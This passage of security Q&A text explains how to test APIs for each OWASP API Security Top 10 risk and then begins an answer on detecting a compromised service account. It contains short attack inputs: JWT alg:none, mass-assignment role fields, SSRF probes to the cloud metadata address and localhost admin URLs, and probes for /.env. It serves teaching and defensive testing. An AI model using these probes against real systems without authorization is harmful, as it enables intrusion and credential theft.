10+ consecutive auth failures); UEBA for behavioral anomalies.
Explain the OWASP API Security Top 10 and how to test for each.

OWASP API Security Top 10 (2023): API1 -- Broken Object Level Authorization (BOLA/IDOR): API returns data for objects it shouldn't; test by changing object IDs in every request (other users' order IDs, profile IDs). API2 -- Broken Authentication: weak credentials, missing MFA, long-lived tokens, tokens in URLs; test: try no auth, weak auth, replay old tokens, JWT alg:none. API3 -- Broken Object Property Level Authorization (Mass Assignment + Excessive Data Exposure): API accepts extra fields in POST body that elevate privileges ({role:'admin'}); or returns more fields than needed (password hash in user object); test: send extra properties; inspect all response fields. API4 -- Unrestricted Resource Consumption: no rate limiting, no payload size limits, unbounded requests; test: send 100 requests/second, upload 1GB file, request 10000 records. API5 -- Broken Function Level Authorization: admin-only endpoints accessible by regular users; test: use regular user token to call /api/admin/users, DELETE /api/users/other_id, POST /api/disable-mfa. API6 -- Unrestricted Access to Sensitive Business Flows: automated abuse of business functions (mass account creation, gift card enumeration, voting manipulation); test: replay successful business flows at high rate. API7 -- Server-Side Request Forgery (SSRF): API fetches URL provided by user; test: provide internal URLs (http://169.254.169.254/, http://localhost:8080/admin). API8 -- Security Misconfiguration: debug endpoints, verbose errors, permissive CORS, unnecessary HTTP methods; test: OPTIONS request to see allowed methods; probe /.env, /debug, /metrics. API9 -- Improper Inventory Management: shadow APIs (/api/v0/, /api-test/), unretired API versions; test: fuzz version numbers and prefixes. API10 -- Unsafe Consumption of APIs: app trusts third-party APIs without validation; test: MITM responses from third-party APIs (Burp upstream proxy); inject malicious content.
How do you detect and investigate a compromised service account?

Compromised service account investigation: DETECTION SIGNALS: (1) Authentication from unexpected locations -- service account authenticating from a workstation (should only authenticate from specific server) or from external IP; SIEM alert: EventCode=4624 account=svc_backup source NOT IN (backup_server_IPs).
